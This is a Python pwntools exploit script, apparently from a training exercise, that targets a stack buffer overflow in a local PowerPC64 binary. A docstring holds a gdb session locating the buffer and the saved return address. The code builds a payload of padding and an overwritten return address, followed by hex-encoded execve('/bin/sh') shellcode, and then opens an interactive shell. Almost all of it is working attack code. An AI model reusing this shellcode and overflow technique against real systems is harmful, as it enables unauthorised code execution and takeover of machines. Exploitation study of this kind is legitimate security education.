#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x00000000100007b4 <+0>:	mflr    r0
   0x00000000100007b8 <+4>:	std     r0,16(r1)
...
   0x0000000010000820 <+108>:	ld      r0,16(r1)
   0x0000000010000824 <+112>:	mtlr    r0
   0x0000000010000828 <+116>:	ld      r31,-8(r1)
   0x000000001000082c <+120>:	blr
   0x0000000010000830 <+124>:	.long 0x0
   0x0000000010000834 <+128>:	.long 0x1
   0x0000000010000838 <+132>:	lwz     r0,1(r1)
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x100007c8: file src/04-shellcode-static.c, line 6.
(gdb) b *0x0000000010000820
Breakpoint 2 at 0x10000820: file src/04-shellcode-static.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/04-shellcode-static.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ff930 ""
(gdb) c
Continuing.

Breakpoint 2, 0x0000000010000820 in vulnerable () at src/04-shellcode-static.c:14
14	}
(gdb) p/x $r1+16
$2 = 0x40007ff9d0
"""

import struct
import sys

from pwn import *

context(arch='powerpc64', os='linux', endian='big', word_size=64)

binary_path = './bin/ppc64/04-shellcode-static'

saved_pc_addr = 0x40007ff9d0
buffer_addr = 0x40007ff930

# Adapted from http://shell-storm.org/shellcode/files/shellcode-86.php
shellcode = \
	'\x7c\x3f\x0b\x78' + \
	'\x7c\xa5\x2a\x79' + \
	'\x42\x40\xff\xf9' + \
	'\x7f\x08\x02\xa6' + \
	'\x3b\x18\x01\x34' + \
	'\x98\xb8\xfe\xfb' + \
	'\x38\x78\xfe\xf4' + \
	'\xf8\x61\xff\xf0' + \
	'\x38\x81\xff\xf0' + \
	'\xf8\xa1\xff\xf8' + \
	'\x3b\xc0\x01\x60' + \
	'\x7f\xc0\x2e\x70' + \
	'\x44\x00\x00\x02' + \
	'/bin/shZ'

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p64(saved_pc_addr + 8)
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
